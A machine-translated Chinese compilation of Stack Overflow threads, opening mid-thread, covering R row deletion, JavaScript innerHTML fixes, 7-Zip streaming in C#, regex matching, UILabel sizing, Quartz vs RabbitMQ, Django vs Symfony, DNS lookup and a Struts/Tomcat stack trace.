> 时间：2017-08-09T11:54:34.977

在数据框中创建 id 列或使用任何列名来标识行。使用索引删除是不公平的。

使用`subset`函数创建新框架。

```
updated_myData <- subset(myData, id!= 6)
print (updated_myData)

updated_myData <- subset(myData, id %in% c(1, 3, 5, 7))
print (updated_myData) 
```

* * *

## 回答 #5

> 赞同：12
> 
> 时间：2018-09-06T08:31:51.497

**按简化顺序：**

```
mydata[-(1:3 * 2), ] 
```

**按顺序：**

```
mydata[seq(1, nrow(mydata), by = 2) , ] 
```

**按负序：**

```
mydata[-seq(2, nrow(mydata), by = 2) , ] 
```

**或者，如果您想通过选择奇数进行子集化：**

```
mydata[which(1:nrow(mydata) %% 2 == 1) , ] 
```

**或者，如果您想通过选择奇数进行子集化，版本 2：**

```
mydata[which(1:nrow(mydata) %% 2 != 0) , ] 
```

**或者，如果您想通过过滤偶数来进行子集化：**

```
mydata[!which(1:nrow(mydata) %% 2 == 0) , ] 
```

**或者，如果您想通过过滤掉偶数来进行子集化，版本 2：**

```
mydata[!which(1:nrow(mydata) %% 2 != 1) , ] 
```

* * *

## 回答 #6

> 赞同：8
> 
> 时间：2020-04-20T23:50:37.440

为了完整起见，我将补充一点，这也可以`dplyr`使用`slice`. 使用它的优点是它可以成为管道工作流的一部分。

```
df <- df %>%
  .
  .
  slice(-c(2, 4, 6)) %>%
  .
  . 
```

当然，您也可以在没有管道的情况下使用它。

```
df <- slice(df, -c(2, 4, 6)) 
```

“非向量”格式`-c(2, 4, 6)`意味着获取*不在*第 2、4 和 6 行的所有内容。对于使用范围的示例，假设您想删除前 5 行，您可以执行`slice(df, 6:n())`. 有关更多示例，请参阅[文档](https://dplyr.tidyverse.org/reference/slice.html)。

* * *

## 回答 #7

> 赞同：6
> 
> 时间：2019-01-30T01:27:54.580

从 employee.data 中删除 Dan - 无需管理新的 data.frame。

```
employee.data <- subset(employee.data, name!="Dan") 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2019-02-24T08:46:37.703

这是一个按索引删除行的快速而肮脏的功能。

```
removeRowByIndex <- function(x, row_index) {
  nr <- nrow(x)
  if (nr < row_index) {
    print('row_index exceeds number of rows')
  } else if (row_index == 1)
  {
    return(x[2:nr, ])
  } else if (row_index == nr) {
    return(x[1:(nr - 1), ])
  } else {
    return (x[c(1:(row_index - 1), (row_index + 1):nr), ])
  }
} 
```

它的主要缺陷是 row_index 参数不遵循作为值向量的 R 模式。可能还有其他问题，因为我只花了几分钟编写和测试它，并且在过去几周才开始使用 R。非常欢迎对此提出任何意见和改进！

# java - Hazelcast 如何从 IMap 中驱逐条目

> ID：12328057
> 
> 赞同：0
> 
> 时间：2012-09-08T04:37:55.277
> 
> 标签：java, hazelcast

关于榛树驱逐进入的快速问题..

我有一个大小（**map_size_per_jvm**）为 6 的 IMap，它由 MapStore 支持（保存到 mysql 数据库中），并且 write-delay-seconds 设置为 60 秒。

如果我在 60 秒时获得数据（在 10 秒间隔内）地图大小为 6，会发生什么？ ***它会先存储数据还是先驱逐数据？如果它首先驱逐数据，我将如何在驱逐开始之前先存储数据？*** 请不要通过设置**eviction-delay-seconds**说：我可以延迟。

我应该使用**EntryListener**（当驱逐事件触发时，我可以将它存储到数据库中）吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-09T10:39:18.037

在驱逐之前，无论写入延迟秒是多少，hazelcast 都会保留数据。您可以轻松地手动检查此调用 evict()。

# javascript - 为什么我的 javascript 没有修改 html？

> ID：12328066
> 
> 赞同：2
> 
> 时间：2012-09-08T04:40:07.427
> 
> 标签：javascript, html

应该在输入字段和发送按钮之间插入输入的文本，但它没有注意到。

```
<body>                              
    <section>
        <p>passcode: <input type=text id=passcode></p>
        <section id=middle></section>
        <p><input type=button id=button value=send></p>
    </section>
    <script type="text/javascript">
        var log=new Array();
        document.getElementById("button").onclick=exlog();
        exlog(){
            log.push(document.getElementById("passcode").value)
            for(i=0;i<log.length;i++){
            document.getElementById("middle").innerHtml=log[i];
        }
    }
    </script>
</body> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-08T04:49:56.117

改变

```
 document.getElementById("middle").innerHtml=log[i]; 
```

到

```
 document.getElementById("middle").innerHTML=log[i]; 
```

参考：[https ://developer.mozilla.org/en-US/docs/DOM/element.innerHTML](https://developer.mozilla.org/en-US/docs/DOM/element.innerHTML)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-08T04:45:21.023

您的`exlog`函数缺少 function 关键字，并且您错误地设置了 onclick 处理程序。

也`innerHtml`应该是`innerHTML`

```
 document.getElementById("button").onclick=exlog;
    function exlog(){
        log.push(document.getElementById("passcode").value)
        for(i=0;i<log.length;i++){
        document.getElementById("middle").innerHTML=log[i];
    } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-08T04:53:59.813

我注意到您的代码存在一些问题。最重要的是，您应该使用innerHTML，而不是innerHtml（注意大写）。

此外，您需要小心处理函数的方式。只放 exlog(){} 不会创建函数。相反，您应该使用 function 关键字。

最后，您要将 onclick 处理程序设置为函数 exlog。您所使用的实际上会将 onclick 处理程序设置为评估 exlog 函数的结果。

这是一个包含所有建议更改的解决方案：

```
<body>                              
<section>
    <p>passcode: <input type=text id=passcode></p>
    <section id=middle></section>
    <p><input type=button id=button value=send></p>
</section>
<script type="text/javascript">
    var log=new Array();
    document.getElementById("button").onclick=exlog;
    function exlog(){
        log.push(document.getElementById("passcode").value)
        for(i=0;i<log.length;i++){
alert(log[i]);
        document.getElementById("middle").innerHTML=log[i];
    }
}
</script>
</body> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-08T04:45:51.920

您正在通过像这样使用它来评估函数：`exlog()`，因为 exlog 没有 return 语句，所以它评估为`undefined`，浏览器不会执行。

如果你想分配它，你可以使用它的名字`exlog`

此外，正如 Teemu 和 Musa 所提到的，函数的定义中缺少关键字`exlog`

另外，大小写`innerHTML`必须准确，混合大小写是行不通的。

```
<body>                              
    <section>
        <p>passcode: <input type=text id=passcode></p>
        <section id=middle></section>
        <p><input type=button id=button value=send></p>
    </section>
    <script type="text/javascript">
        var log = [];
        document.getElementById("button").onclick = exlog; // <== no need to evaluate the function, just assign it.
        function exlog(){ // <== as pointed out below function keyword was missing
            log.push(document.getElementById("passcode").value);
            document.getElementById("middle").innerHTML += log[log.length - 1]; // <== needs to be capitilized exactly like this
        }
    </script>
</body> 
```

# c# - 7zip压缩网络流

> ID：12328068
> 
> 赞同：3
> 
> 时间：2012-09-08T04:40:41.467
> 
> 标签：c#, networking, compression, 7zip

我想在通过网络发送文件之前对其进行压缩。我认为最好的方法是 7zip，因为它是免费和开源的。

**我如何将 7zip 与 .net 一起使用？**

我知道这`7zip`是免费的，并且他们在 c# 中有源代码，但由于某种原因，它在 c# 上非常慢，所以`7z.dll`出于性能原因，我宁愿调用安装 7zip 时附带的 dll。因此，我能够轻松编组和调用方法的方式 `7z.dll`是在名为[Sevenzipsharp](http://sevenzipsharp.codeplex.com/)的库的帮助下。例如，将该 dll 添加到我的项目中将使我能够执行以下操作：

![在此处输入图像描述](../Images/aeb68c297a463cdf2d86be44151d2f0f.png)

```
 // if you installed 7zip 64bit version then make sure you change plataform target
        // like on the picture I showed above!
        SevenZip.SevenZipCompressor.SetLibraryPath(@"C:\Program Files\7-Zip\7z.dll");

        var stream = System.IO.File.OpenRead(@"SomeFileToCompress.txt");
        var outputStream = System.IO.File.Create("Output.7z");

        SevenZip.SevenZipCompressor compressor = new SevenZip.SevenZipCompressor();
        compressor.CompressionMethod = SevenZip.CompressionMethod.Lzma2;
        compressor.CompressionLevel = SevenZip.CompressionLevel.Ultra;
        compressor.CompressStream(stream, outputStream); 
```

这就是我在 c# 中使用 7zip 的方式。

**现在我的问题是：**

我想通过网络发送一个压缩文件。我知道我可以先压缩它然后发送它。该文件是4GB，所以我将不得不等待很长时间才能压缩它。我将在硬盘驱动器上浪费大量空间。然后我终于可以发送它了。我认为这太复杂了。**我想知道如何在压缩文件的同时发送文件。**

* * *

## SevenZipSharp 似乎有问题：

![在此处输入图像描述](../Images/ae839a0e9efe38ae3d0e88997282f280.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-08T04:52:34.240

您是否考虑过备用库 - 一个甚至不需要安装/可用 7-Zip 的库？

从[http://dotnetzip.codeplex.com/](http://dotnetzip.codeplex.com/)上发布的描述中：

> 从流内容创建 zip 文件、保存到流、提取到流、从流中读取

与 7-Zip 不同，DotNetZip 旨在与 C# / .Net 一起使用。

大量示例（包括流式传输）可在[http://dotnetzip.codeplex.com/wikipage?title=CS-Examples&referringTitle=Examples 获得](http://dotnetzip.codeplex.com/wikipage?title=CS-Examples&referringTitle=Examples)。

另一种选择是使用 7-Zip 命令行版本 (7z.exe)，并从标准输入/输出写入/读取。这将允许您使用 7-Zip 文件格式，同时将所有核心工作保留在本机代码中（尽管可能不会有太大的显着差异）。

回顾 SevenZipSharp：

> 自 0.29 版本以来，支持流式传输。

查看[http://sevenzipsharp.codeplex.com/SourceControl/changeset/view/59007#364711](http://sevenzipsharp.codeplex.com/SourceControl/changeset/view/59007#364711)：

看来您需要这种方法：

```
public void CompressStream(Stream inStream, Stream outStream) 
```

感谢您在这里考虑性能！我认为太多人会做你想要避免的事情：压缩到临时文件，然后对临时文件做一些事情。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-12-27T00:40:41.040

CompressStream 抛出异常。我的代码如下：

```
 public void TestCompress()
    {
        string fileToCompress = @"C:\Users\gary\Downloads\BD01.DAT";
        byte[] inputBytes = File.ReadAllBytes(fileToCompress);
        var inputStream = new MemoryStream(inputBytes);

        byte[] zipBytes = new byte[38000000];   // this memory size is large enough.
        MemoryStream outStream = new MemoryStream(zipBytes);

        string compressorEnginePath = @"C:\Engine\7z.dll";
        SevenZipCompressor.SetLibraryPath(compressorEnginePath);

        compressor = new SevenZip.SevenZipCompressor();
        compressor.CompressionLevel = CompressionLevel.Fast;
        compressor.CompressionMethod = CompressionMethod.Lzma2;
        compressor.CompressStream(inputStream, outputStream);

        inputStream.Close();
        outputStream.Close(); 
```

异常消息：消息：测试方法 Test7zip.UnitTest1.TestCompress 抛出异常：SevenZip.SevenZipException：由于 SevenZipSharp 中的错误，执行失败。请向[http://sevenzipsharp.codeplex.com/WorkItem/List.aspx](http://sevenzipsharp.codeplex.com/WorkItem/List.aspx)报告，发布版本号并附上存档

# c# - 什么是正则表达式？

> ID：12328075
> 
> 赞同：1
> 
> 时间：2012-09-08T04:41:59.333
> 
> 标签：c#, .net, regex, vb.net, visual-c++

首先，我想我将首先询问构建正则表达式字符串的一些好的工具或参考资料是什么？我通常在网上找到它们，但我很想多了解它们。

现在回到我最初的问题：查找完整字符串或查找包含该字符串的行的正则表达式是什么。字符串是：

```
** Start of 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-08T04:46:33.847

您正在寻找的正则表达式是：`\*\* Start of.*`

因为 C# 有自己的转义字符，您可能希望将其放在逐字字符串中，例如`@"\*\* Start of.*"`.

帮助您构建、学习和理解正则表达式的最佳工具是[RegexBuddy](http://www.regexbuddy.com/)。它可以帮助您查看表达式的含义，并通过直观的图形 UI 对其进行测试。 ![它可以帮助您查看表达式的含义，并通过直观的图形 UI 对其进行测试](../Images/e07f4c59487aef21228a2f1d77e901e1.png)

有关正则表达式（跨不同语言）的最完整信息资源是[http://www.regular-expressions.info/](http://www.regular-expressions.info/)。如果您想了解特定的正则表达式实现，您最好阅读特定于实现的文档/规范。对于 .NET，一个很好的起点是[MSDN 上的 Regex 文档您还可以使用](http://msdn.microsoft.com/en-us/library/hs600312.aspx)[http://derekslager.com/blog/posts/2007/09/a-better](http://derekslager.com/blog/posts/2007/09/a-better-dotnet-regular-expression-tester.ashx) 上提供的免费工具在线快速测试 .NET 正则表达式[-dotnet-正则表达式-tester.ashx](http://derekslager.com/blog/posts/2007/09/a-better-dotnet-regular-expression-tester.ashx)

我还想指出，我同意@ziesemer 的观点，即对于这种简单的模式，使用`IndexOf`or`StartsWith`方法可能是更好的解决方案。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-08T04:45:31.593

我认为你使用了错误的工具来完成这项工作。正则表达式最适合查找模式。看来您只是想做一个简单的搜索 -`IndexOf`为此使用适当的 API（例如）。

否则，您只需要转义星号 - 它们是正则表达式中的特殊字符 - 表示“匹配 0 个或多个”：

```
\*\* Start of 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-08T04:51:37.517

要学习正则表达式，您可以查看[www.regular-expressions.info](http://www.regular-expressions.info)上的[正则表达式基本语法参考](http://www.regular-expressions.info/reference.html)以及另外[一个温和的介绍：基础知识](http://www.zytrax.com/tech/web/regex.htm)

关于要查找的字符串是否只需要从 a 到 z 的字符，那么我认为您应该写为

```
^[a-zA-Z]$ 
```

这将需要小而大写的 a 到 z 字符。

## 更新

```
^\*\* Start of(.*?)$ 
```

**拆分细节**

*   `\*`, 考虑星号
*   `Start of`, 准确比较这个字符串
*   `(.*?)`, 在那一行上取任何东西

    `^\*\* Start of(.*?)(([\n]*(.*?)){19})*$`

**拆分细节**

*   `\*`, 考虑星号
*   `Start of`, 准确比较这个字符串
*   `(.*?)(([\n]*(.*?)){19})*`, 取任何东西，但不超过 19 行

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-08T08:30:35.373

虽然信息量很大，但没有一个答案为您的特定问题提供正确的正则表达式。这里是：

```
string regexPattern = @"^.*?\*{2} Start of.*?$"; 
```

请注意，您必须`multiline`在搜索匹配项时指定选项。

你可以在**[这里](http://regexr.com?32373)**看到结果。

这是模式的解释：

```
^.*?\*{2} Start of.*?$

Options: ^ and $ match at line breaks

Assert position at the beginning of a line (at beginning of the string or after a line break character) «^»
Match any single character that is not a line break character «.*?»
    Between zero and unlimited times, as few times as possible, expanding as needed (lazy) «*?»
Match the character “*” literally «\*{2}»
    Exactly 2 times «{2}»
Match the characters “ Start of” literally « Start of»
Match any single character that is not a line break character «.*?»
    Between zero and unlimited times, as few times as possible, expanding as needed (lazy) «*?»
Assert position at the end of a line (at the end of the string or before a line break character) «$» 
```

# gwt - GWT ：单元格树和初始键盘选择节点

> ID：12328076
> 
> 赞同：0
> 
> 时间：2012-09-08T04:42:33.340
> 
> 标签：gwt

我正在使用带有 KeyboardSelectionPolicy.BOUND_TO_SELECTION 的 CellTree。

我想打开选择给定路径的树。

当 KeyboardSelectionPolicy 启用/禁用时，打开子路径并选择节点的代码工作正常但是当 BOUND_TO_SELECTION 我可以看到树中的键盘选择节点永远不会更新： cellTree.selectionModel.setSelected( ... )

所以我想知道 setSelected 是否可以与 BOUND_TO_SELECTION 一起使用以及如何做到这一点。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-08T11:13:04.980

请参阅[http://code.google.com/p/google-web-toolkit/issues/detail?id=6310](http://code.google.com/p/google-web-toolkit/issues/detail?id=6310)

我想你可以找到一种方法来`setKeyboardSelectedRow`响应`SelectionChangeEvent`s.

# ios5 - UILabel 和 numberOfLines 和 sizeToFit：

> ID：12328077
> 
> 赞同：11
> 
> 时间：2012-09-08T04:42:53.133
> 
> 标签：ios5, uilabel, text-size, sizetofit

在 iOS 5 上。

我有一个最初放置在笔尖中的 UILabel 元素。我希望 x 位置保持固定。我希望它采用 1 行或 2 行。如果多于两行，则应使用换行设置来显示省略号。

我使用`numberOfLines`财产和`-sizeToFit`

如果我将 UILabel 的`numberOfLines`属性设置为 0，它会正确地看到对于某些文本，没有足够的空间，并会在调用后将其换行到第二行，`-sizeToFit`但在极少数情况下，该行的长度足以延伸到 3 行，我得到三行，我不想要。如果我将`numberOfLines`属性设置为 2，它实际上会将整个东西拉伸到一条线上，并将我在笔尖中设置的初始框架拉长得更宽。

```
 CGRect titleFrame = [[self titleLabel] frame];
 [[self titleLabel] setNumberOfLines:0];
 [[self titleLabel] setText:newProductTitleText];
 [[self titleLabel] sizeToFit];
 CGRect newTitleFrame = [[self titleLabel] frame]; 
```

CGRect 只是为了让我能够在事后进行计算。因此设置`numberOfLines`为 0 有效，并且不会更改框架中的原始 origin.x，并且会将长文本分成多行，但不会将其限制为 2 行。将`numberOfLines`属性设置为 2，当我阅读 Apple 文档时

> 此属性控制要使用的最大行数，以使标签的文本适合其边界矩形。此属性的默认值为 1。要删除任何最大限​​制并根据需要使用尽可能多的行，请将此属性的值设置为 0。

看来我应该可以将其设置为两个并且仍然可以正常工作。我希望`sizeToFit`在扩展以适合所有文本时在正 X 和 Y 方向上扩展，但当`numberOfLines`设置为 0 以外时它在负 X 方向上扩展。

ETA：“Autosize”支柱设置为左上角以将其固定在最小 x,y 处。

感谢您的任何见解。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-15T17:36:34.730

我有一个类似的问题，`-[UILabel sizeToFit]`没有考虑我设置`numberOfLines`为 2 时设置的最大宽度。以下是我解决该问题的方法：

```
 CGFloat titleMaxWidth = 200;
    CGFloat titleMinHeight = 30;
    CGFloat titleMaxHeight = 40;
    UILabel *titleLabel = [[UILabel alloc] initWithFrame:CGRectMake(10, 5, titleMaxWidth, titleMaxHeight)]; // alternatively, you could do this in a nib
    titleLabel.numberOfLines = 0;
    titleLabel.text = @"The title label will be sized appropriately with this technique.";
    titleLabel.font = [UIFont boldSystemFontOfSize:16];
    [titleLabel sizeToFit];
    titleLabel.numberOfLines = 2;
    if (titleLabel.height > titleMaxHeight)
    {
        titleLabel.height = titleMaxHeight;
    }
    else if (titleLabel.height < titleMinHeight)
    {
        titleLabel.height = titleMinHeight;
    } 
```

如您所见，我还想要标签的最小高度，因为`-sizeToFit`通常会使标签非常小，但如果您不关心最小高度，则可以忽略该代码。titleMaxHeight 的“幻数”40 来自实验，发现使用这种字体的 2 行标签实际上只需要 40px。在这段代码中，`-sizeToFit`主要用于保持文本在宽度以内，当我们有一个短字符串时，判断初始高度40是否可以减小。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-09-05T14:58:40.233

我使用了 UIFont 属性 lineHeight：

```
CGFloat labelHeight = label.font.lineHeight*label.numberOfLines; 
```

# php - 动态页码

> ID：12328080
> 
> 赞同：0
> 
> 时间：2012-09-08T04:43:27.537
> 
> 标签：php, javascript, jquery, asp.net

我想通过动态分配的页码浏览我的网站。例如，当我发布一个新主题时，它应该显示在主页上，并且之前的帖子应该自动切换到“第 2 页”。我想在不使用 CMS 的情况下做到这一点。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T04:47:49.350

使用 foreach 循环遍历帖子，并为每个帖子创建一个链接并显示带有您想要的数字的链接，如下所示：

（假设`$posts`是一个url数组）

```
<?
$page_number = 1;
foreach($posts as $key) { ?>
<a href="<?= $key; ?>">Page <?= $page_number; ?></a>
<? $page_number++ ?>

<?
} ?> 
```

# rabbitmq - Quartz和rabbitMQ，有什么区别？

> ID：12328081
> 
> 赞同：1
> 
> 时间：2012-09-08T04:43:37.797
> 
> 标签：rabbitmq, quartz-scheduler

Quartz 和 RabbitMQ，这些技术的区别是什么？它们可以一起使用吗？这些技术可以安装在托管 Web 服务器的硬件上，还是为它们配备专用硬件更好？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-09-10T09:16:36.877

我们首先假设您指的是[Quartz，一个调度程序](http://quartz-scheduler.org)，而不是[Quartz，一个 Mac OS X 图形层](http://en.wikipedia.org/wiki/Quartz_%28graphics_layer%29)。;)

*   [RabbitMQ](http://rabbitmq.com)是一个消息队列。消息队列确保消息到达目的地，在停机期间持续存在并在多个工作进程之间进行负载平衡。如果您有多个进程在执行不同类型的工作并且您需要一种分配工作负载的方法，那么您通常需要一个消息队列。
*   Quartz 是一个调度器。调度程序确保事件在正确的时间发生，可能确保一个事件在另一个事件开始之前正确执行，或者在停机后赶上时间表。如果 crontab 等基本操作系统功能不足以满足您的需求，您通常需要一个调度程序。

结合这两个概念可以很强大：让调度程序触发事件或事件链进入消息队列，并让许多工作人员在各自的队列上监听以执行分配的任务。

根据您想要实现的目标，将所有东西都放在同一台机器上可能是完全可以的。当您遇到性能不佳时，您可以决定是想要更大的机器还是将工作负载分配到许多较小的机器上。

您可能想查看 RabbitMQ 和 Quartz 网站上的教程，看看其中一个或两个是否适合您的目的。

# c# - 使用 ASP.NET 和 C# 从 URL 生成屏幕截图

> ID：12328085
> 
> 赞同：0
> 
> 时间：2012-09-08T04:45:08.987
> 
> 标签：c#, asp.net

我想使用其 URL 生成网站的屏幕截图。

这是我想使用 ASP.NET 和 C# 创建的，我**不想**使用任何可用的工具和 API（Url2Png、Wesnappr、Awesomium 等）。

我应该为此探索哪些 ASP.NET 和 C# 类？我应该如何开始呢？

请有人指导我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-08T04:55:16.147

看起来像手工做的有趣项目......

*   阅读 W3C 网站了解[HTML](http://www.w3.org/TR/#tr_HTML)和[CSS](http://www.w3.org/TR/#tr_CSS)规范（HTML 为 4+5，CSS 为 1+2+3）
*   实现自己的 HTML 引擎
*   阅读[ECMA 规范](http://ecma-international.org/ecma-262/5.1/)以了解 JavaScript 的内部工作原理。也不要忘记为您检查最流行的浏览器的具体实现。
*   实现自己的 JavaScript 引擎
*   将 HTML 和 JavaScript 引擎结合在一起

现在，当您有办法在服务器上安全地渲染 HTML 时，这很容易：让您的引擎将页面渲染为位图（可能还需要实现自定义图形库），然后您就完成了。

更严重的是 - 使用现有工具（确保它们可以在服务器上使用 - 即我不会使用 IE 引擎来做）。或者，如果您想了解堆栈的某些特定部分 - 将其余部分缩小（即，只需使用 System.Drawing 将页面的标题呈现为位图）以查看组件如何协同工作。

# c# - 对文本框对象列表进行排序

> ID：12328087
> 
> 赞同：2
> 
> 时间：2012-09-08T04:45:23.810
> 
> 标签：c#, list, sorting, textbox

我想扫描一些序列号以只读文本框。我创建了一个文本框列表，但我不知道如何按文本框名称对它们进行排序：

```
// This gets all the textboxnames ands makes an array of names and textboxes
foreach (Control groupbox in this.Controls)
{
    if (groupbox is GroupBox)
    {
        foreach (Control textbox in groupbox.Controls)
        {
            if (textbox is TextBox)
            {
                theTextBoxesList.Add((TextBox)textbox);
                TextBoxNames.Add(textbox.Name);

            }
        }
    }
}
TextBoxNames.Sort();

theTextBoxesList.Sort????? 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-08T05:49:26.683

我认为对 TextBox List 进行排序，LINQ Query 可能会对您有所帮助。使用 OrderBy 对 TextBox 进行升序排序，或者使用 OrderByDescending 对 TextBox 进行降序排序。

升序排序：

```
theTextBoxesList = theTextBoxesList.OrderBy(x => x.Name).ToList(); 
```

降序排序：

```
theTextBoxesList = theTextBoxesList.OrderByDescending(x => x.Name).ToList(); 
```

这有帮助吗？

有关排序数据的更多信息，请访问[http://msdn.microsoft.com/en-us/library/bb546145.aspx](http://msdn.microsoft.com/en-us/library/bb546145.aspx)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-08T04:57:04.650

尝试

```
theTextBoxesList = theTextBoxesList.OrderBy(x => x.Name).toList(); 
```

它应该工作。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-08T05:04:50.620

您必须提供比较，因为`TextBox`它不是原始类型：

```
theTextBoxesList.Sort(new Comparison<TextBox>(
    (tb1, tb2) => { return tb1.Name.CompareTo(tb1.Name); }
)); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-08T05:03:45.233

```
theTextBoxesList.Sort( (a,b) => String.Compare(a.S,b.S) ); 
```

# python - django和symfony2的相似度有多少

> ID：12328089
> 
> 赞同：3
> 
> 时间：2012-09-08T04:45:25.640
> 
> 标签：python, django, symfony

我知道 symfony2 并且刚刚在其中完成了大量的 Web 应用程序。我喜欢它。一年前我做了 django 1.3 但不多。

现在我们有了一个想要在 python django 中创建 Web 应用程序的客户。

现在我知道模板、记录器等在两者中都是相同的。但我不知道高级主题。谁能解释一下Django中是否存在这些东西

1.  注释，即使用注释的 vaidations、orm、路由
2.  django 的任何依赖注入容器中是否存在
3.  我可以使用角色来确保安全吗？我的意思是保护 ULS，特定用户的方法
4.  事件处理程序，如 prePersist ， PostUpdate 用于在某些实体创建中执行操作

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T09:05:56.843

1.  Django 在它诞生的那一天就有了 orm。您将数据映射到[模型](https://docs.djangoproject.com/en/1.4/topics/db/models/)中，使用验证器进行[验证](https://docs.djangoproject.com/en/1.4/ref/validators/)，然后通过[urlconf](https://docs.djangoproject.com/en/1.4/topics/http/urls/) “路由”请求。

2.  [是的](https://github.com/ivan-korobkov/python-inject)

3.  Django里面有[auth](https://docs.djangoproject.com/en/1.4/topics/auth/)框架

4.  [信号](https://docs.djangoproject.com/en/1.4/topics/signals/)，但对于您需要执行的大多数事后/预初始化/创建/编辑/删除，您可以重载模型的相应方法，毕竟模型是类。

# c++ - c/c++ 中的 DNS 查找

> ID：12328093
> 
> 赞同：1
> 
> 时间：2012-09-08T04:45:42.920
> 
> 标签：c++, c, dns, nslookup, dig

我必须编写一个有点像 dig 和 nslookup 的 C/C++ 程序：它必须知道任何站点的 IP 地址。它应该像 dig www.example.com MX +short 命令那样做。我无法想象如何做到这一点。有任何想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-08T05:03:09.160

使用您喜欢的任何解析器库。流行的库包括[UDNS](http://www.corpit.ru/mjt/udns.html)和[adns](http://www.chiark.greenend.org.uk/~ian/adns/)。您也可以将源代码修改为`dig`（这是[绑定](https://www.isc.org/software/bind)分发的一部分）。

# linux - 在linux + openJDK错误中运行struts + tomcat6应用程序

> ID：12328100
> 
> 赞同：0
> 
> 时间：2012-09-08T04:46:39.767
> 
> 标签：linux, struts2, tomcat6, jfreechart, openjdk

尝试在 Eclipse 中运行我的应用程序时出现以下异常。

```
 Caused by: Unable to load configuration. - Class: java.net.AbstractPlainSocketImpl
    File: AbstractPlainSocketImpl.java
    Method: connect
    Line: 158 - java/net/AbstractPlainSocketImpl.java:158:-1
    at com.opensymphony.xwork2.config.ConfigurationManager.getConfiguration(ConfigurationManager.java:58)
    at org.apache.struts2.dispatcher.Dispatcher.init_PreloadConfiguration(Dispatcher.java:374)
    at org.apache.struts2.dispatcher.Dispatcher.init(Dispatcher.java:418)
    ... 20 more
    Caused by: Unable to load jar:file:/var/lib/tomcat6/webapps/webapps/cute/WEB-         INF/lib    /struts2-jfreechart-plugin-2.3.4.jar!/struts-plugin.xml - Class:    java.net.AbstractPlainSocketImpl
File: AbstractPlainSocketImpl.java
Method: connect
Line: 158 - java/net/AbstractPlainSocketImpl.java:158:-1
    at com.opensymphony.xwork2.config.providers.XmlConfigurationProvider.loadConfigurationFiles(XmlConfigurationProvider.java:898)
    at com.opensymphony.xwork2.config.providers.XmlConfigurationProvider.loadDocuments(XmlConfigurationProvider.java:143)
    at com.opensymphony.xwork2.config.providers.XmlConfigurationProvider.init(XmlConfigurationProvider.java:110)
    at com.opensymphony.xwork2.config.impl.DefaultConfiguration.reloadContainer(DefaultConfiguration.java:168)
    at com.opensymphony.xwork2.config.ConfigurationManager.getConfiguration(ConfigurationManager.java:55)
    ... 22 more
Caused by: struts.apache.org - Class: java.net.AbstractPlainSocketImpl
File: AbstractPlainSocketImpl.java
Method: connect
Line: 158 - java/net/AbstractPlainSocketImpl.java:158:-1
    at com.opensymphony.xwork2.util.DomHelper.parse(DomHelper.java:115)
    at com.opensymphony.xwork2.config.providers.XmlConfigurationProvider.loadConfigurationFiles(XmlConfigurationProvider.java:893)
    ... 26 more
Caused by: java.net.UnknownHostException: struts.apache.org
    at java.net.AbstractPlainSocketImpl.connect(AbstractPlainSocketImpl.java:158)
    at java.net.Socket.connect(Socket.java:546)
    at java.net.Socket.connect(Socket.java:495)
    at sun.net.NetworkClient.doConnect(NetworkClient.java:174)
    at sun.net.www.http.HttpClient.openServer(HttpClient.java:409)
    at sun.net.www.http.HttpClient.openServer(HttpClient.java:530)
    at sun.net.www.http.HttpClient.<init>(HttpClient.java:240)
    at sun.net.www.http.HttpClient.New(HttpClient.java:321)
    at sun.net.www.http.HttpClient.New(HttpClient.java:338)
    at sun.net.www.protocol.http.HttpURLConnection.getNewHttpClient(HttpURLConnection.java:814)
    at sun.net.www.protocol.http.HttpURLConnection.plainConnect(HttpURLConnection.java:755)
    at sun.net.www.protocol.http.HttpURLConnection.connect(HttpURLConnection.java:680)
    at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1005)
    at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.setupCurrentEntity(XMLEntityManager.java:653)
    at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.startEntity(XMLEntityManager.java:1291)
    at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.startDTDEntity(XMLEntityManager.java:1258)
    at com.sun.org.apache.xerces.internal.impl.XMLDTDScannerImpl.setInputSource(XMLDTDScannerImpl.java:259)
    at com.sun.org.apache.xerces.internal.impl.XMLDocumentScannerImpl$DTDDriver.dispatch(XMLDocumentScannerImpl.java:1167)
    at com.sun.org.apache.xerces.internal.impl.XMLDocumentScannerImpl$DTDDriver.next(XMLDocumentScannerImpl.java:1064)
    at com.sun.org.apache.xerces.internal.impl.XMLDocumentScannerImpl$PrologDriver.next(XMLDocumentScannerImpl.java:977)
    at com.sun.org.apache.xerces.internal.impl.XMLDocumentScannerImpl.next(XMLDocumentScannerImpl.java:624)
    at com.sun.org.apache.xerces.internal.impl.XMLNSDocumentScannerImpl.next(XMLNSDocumentScannerImpl.java:116)
    at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl.scanDocument(XMLDocumentFragmentScannerImpl.java:486)
